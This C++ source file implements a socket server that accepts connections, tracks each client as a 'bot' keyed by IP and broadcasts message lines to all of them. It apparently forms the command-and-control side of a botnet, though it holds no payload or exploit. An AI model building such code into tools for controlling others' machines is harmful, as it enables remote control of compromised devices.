#include "server.hpp"

server::server(std::string host, int port)
{
    this->sfd = 0;
    this->port = port;
    this->host = host;
}

bool server::setup()
{
    this->sfd = socket(AF_INET, SOCK_STREAM, 0);
    if (this->sfd == -1)
    {
        perror("socket");
        return false;
    }
    struct sockaddr_in addr = { AF_INET, htons(this->port), { inet_addr(this->host.c_str()) } };
    const int enable = 1;
    setsockopt(this->sfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int));
    if (bind(this->sfd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        perror("bind");
        return false;
    }
    if (listen(this->sfd, SOMAXCONN) == -1)
    {
        perror("listen");
        return false;
    }
    return true;
}

void server::add(std::string ip, int port, int fd)
{
    bot *newbot = new bot();
    newbot->ip = ip;
    newbot->port = port;
    newbot->fd = fd;
    newbot->isAlive = true;
    newbot->unique_name = ip + "-DEVICE";
    this->bots.push_back(newbot);
}

void server::cleanup()
{
    for (bot *bot : this->bots)
    {
        bot->words.clear();
        close(bot->fd);
        delete bot;
    }
    this->bots.clear();
    close(this->sfd);
}

void server::handler()
{
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    int cfd = 0;
    bool exists = false;
    while (true)
    {
        exists = false;
        cfd = accept(this->sfd, (struct sockaddr *)&addr, &addr_len);
        if (cfd == -1)        
            continue;

        for (bot *obot : bots)
        {
            if (obot->ip.compare(inet_ntoa(addr.sin_addr)) == 0)
            {
                if (exists == true)
                    close(obot->fd);
                obot->fd = cfd;
                obot->port = addr.sin_port;
                exists = true;
            }
        }

        if (exists == false)
            add(std::string(inet_ntoa(addr.sin_addr)), addr.sin_port, cfd);
    }
}

keyobj::keyobj(std::string key, std::string value)
{
    this->key = key;
    this->value = value;
}

void server::brodcast(std::string message)
{
    message = message + "\r\n";
    for (auto &bot : this->bots)
    {
        if (bot->isAlive == true)
            send(bot->fd, message.c_str(), message.size(), MSG_NOSIGNAL);
    }
}